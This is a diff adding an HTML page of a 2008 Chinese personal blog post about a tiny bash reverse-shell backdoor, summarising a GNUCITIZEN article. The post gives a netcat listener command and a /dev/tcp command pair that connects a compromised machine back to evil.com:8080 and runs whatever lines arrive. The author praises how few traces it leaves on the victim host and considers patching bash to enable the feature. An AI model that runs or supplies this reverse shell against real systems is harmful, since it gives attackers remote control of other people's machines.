@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>bash下超小反弹式后门 – est の 输入 输出和出入</title>
+<link rel="icon" href="https://est.im/favicon.svg">
+    <meta charset="utf-8" />
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta http-equiv="Content-Security-Policy" content="frame-ancestors 'self' https://disqus.com https://player.bilibili.com https://www.youtube.com;">
+    <link href="https://feeds.feedburner.com/initiative" type="application/rss+xml" rel="alternate" title="est の 输入 输出和出入 RSS Feed" />
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="bash下超小反弹式后门" />
+
+    <link rel="canonical" href="https://blog.est.im/archives/626948" />
+    <meta property="og:url" content="https://blog.est.im/archives/626948">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="bash下超小反弹式后门">
+
+    <link rel="stylesheet" href="/theme/css/normalize.min.css" />
+    <link rel="stylesheet" href="/theme/css/style.css" />
+
+
+    <style>
+      body {
+        background: #ecedef url("/theme/img/ignasi_pattern_s.png") repeat;
+      }
+    </style>
+  </head>
+  <body class="single-body">
+<nav class="nav-bar side-padding">
+  <h1 class="nav-header"><a href="/" class="nav-text">
+    est の 输入 输出和出入
+  </a></h1>
+  <div class="hamburger-menu">
+    <button>
+      <span></span>
+      <span></span>
+    </button>
+    <ul id="menu" class="hamburger-menu-overlay">
+      <li><a href="/" class="hamburger-menu-overlay-link">Home</a></li>
+      <li><a href="https://feeds.feedburner.com/initiative" class="hamburger-menu-overlay-link">RSS</a></li>
+      <li><a href="/about" class="hamburger-menu-overlay-link">About</a></li>
+      <li><a href="/category" class="hamburger-menu-overlay-link">Category</a></li>
+
+    </ul>
+  </div>
+</nav>    <main class="content side-text-padding">
+<article class="post">
+  <header class="post-header">
+    <h2 class="post-title">bash下超小反弹式后门</h2>
+    <p class="post-date">Posted <time datetime="2008-04-20T00:00:00+08:00">2008-04-20</time> | <span>archive</span></p>
+  </header>
+
+  
+  <p>今天GNUCITIZEN上有一篇非常handy的文章 <a href="http://www.gnucitizen.org/blog/reverse-shell-with-bash/">Reverse Shell with Bash</a></p>
+<p>在自己电脑上<br />
+<code>nc -l -p 8080 -vvv</code></p>
+<p>然后在肉鸡上<br />
+<code>$ exec 5&lt;&gt;/dev/tcp/evil.com/8080
+$ cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</code></p>
+<p>就得到反弹式shell了。</p>
+<p>实验了一下，不成功。<a href="http://www.linuxsir.org/main/doc/abs/abs3.7cnhtm/devproc.html#FTN.AEN14624">搜索</a>了下，原来编译bash的时候需要加一个 <code>--enable-net-redirections</code> 选项才能使用 /dev/tcp/ 这个特性。nnd。</p>
+<p>这种方法的特点是：不需要任何第三方工具，在肉鸡上留下非常少量的脚板印</p>
+<p>有空看一下可否通过binary hack来搞定这个选项。</p>
+<p>另外GNUCITIZEN的配图都好酷啊，比如这篇文章的<a href="http://flickr.com/photos/asolomon16/403446322/">配图</a>：<br />
+<img alt="freebsd shells" src="http://static.flickr.com/128/403446322_27502dffa2.jpg" /></p>
+</article>
+
+<div class="comments">
+  <h2>Comments</h2>
+  <script type="text/javascript" defer src="https://c.est.im/req4cmt.js"></script>
+</div>    </main>
+
+
+  </body>
+
+</html>
